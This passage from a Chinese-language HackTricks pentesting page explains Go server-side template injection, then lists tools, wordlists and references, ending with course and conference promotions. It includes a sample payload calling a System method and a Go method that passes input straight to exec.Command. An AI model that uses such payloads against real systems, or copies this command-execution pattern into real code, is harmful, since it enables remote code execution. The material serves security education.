<p>RCE 利用在 <code>html/template</code> 和 <code>text/template</code> 之间有显著差异。<code>text/template</code> 模块允许直接调用任何公共函数（使用“call”值），而在 <code>html/template</code> 中不允许。有关这些模块的文档可在 <a href="https://golang.org/pkg/html/template/">这里查看 html/template</a> 和 <a href="https://golang.org/pkg/text/template/">这里查看 text/template</a>。</p>
<p>通过 Go 中的 SSTI 进行 RCE，可以调用对象方法。例如，如果提供的对象具有执行命令的 <code>System</code> 方法，可以像 <code>{{ .System "ls" }}</code> 一样利用它。通常需要访问源代码才能进行利用，如给定的示例所示：</p>
<pre><code class="language-go">func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://blog.takemyhand.xyz/2020/06/ssti-breaking-gos-template-engine-to">https://blog.takemyhand.xyz/2020/06/ssti-breaking-gos-template-engine-to</a></li>
<li><a href="https://www.onsecurity.io/blog/go-ssti-method-research/">https://www.onsecurity.io/blog/go-ssti-method-research/</a></li>
</ul>
<h3 id="更多漏洞"><a class="header" href="#更多漏洞">更多漏洞</a></h3>
<p>查看 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a> 以获取更多漏洞。您还可以在 <a href="https://github.com/DiogoMRSilva/websitesVulnerableToSSTI">https://github.com/DiogoMRSilva/websitesVulnerableToSSTI</a> 找到有趣的标签信息。</p>
<h2 id="blackhat-pdf"><a class="header" href="#blackhat-pdf">BlackHat PDF</a></h2>
<p>{% file src="../../.gitbook/assets/EN-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-BlackHat-15 (1).pdf" %}</p>
<h2 id="相关帮助"><a class="header" href="#相关帮助">相关帮助</a></h2>
<p>如果您认为这可能有用，请阅读：</p>
<ul>
<li><a href="../../network-services-pentesting/pentesting-web/flask.html">Flask 技巧</a></li>
<li><a href="https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/broken-reference/README.md">Python 魔法函数</a></li>
</ul>
<h2 id="工具-1"><a class="header" href="#工具-1">工具</a></h2>
<ul>
<li><a href="https://github.com/Hackmanit/TInjA">https://github.com/Hackmanit/TInjA</a></li>
<li><a href="https://github.com/vladko312/sstimap">https://github.com/vladko312/sstimap</a></li>
<li><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></li>
<li><a href="https://github.com/Hackmanit/template-injection-table">https://github.com/Hackmanit/template-injection-table</a></li>
</ul>
<h2 id="暴力破解检测列表"><a class="header" href="#暴力破解检测列表">暴力破解检测列表</a></h2>
<p>{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}</p>
<h2 id="实践与参考"><a class="header" href="#实践与参考">实践与参考</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting">https://portswigger.net/web-security/server-side-template-injection/exploiting</a></li>
<li><a href="https://github.com/DiogoMRSilva/websitesVulnerableToSSTI">https://github.com/DiogoMRSilva/websitesVulnerableToSSTI</a></li>
<li><a href="https://portswigger.net/web-security/server-side-template-injection">https://portswigger.net/web-security/server-side-template-injection</a></li>
</ul>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p><a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。该大会的 <strong>使命是促进技术知识</strong>，是各个学科的技术和网络安全专业人士的一个热烈交流点。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/ssti-server-side-template-injection/el-expression-language.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/ssti-server-side-template-injection/el-expression-language.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
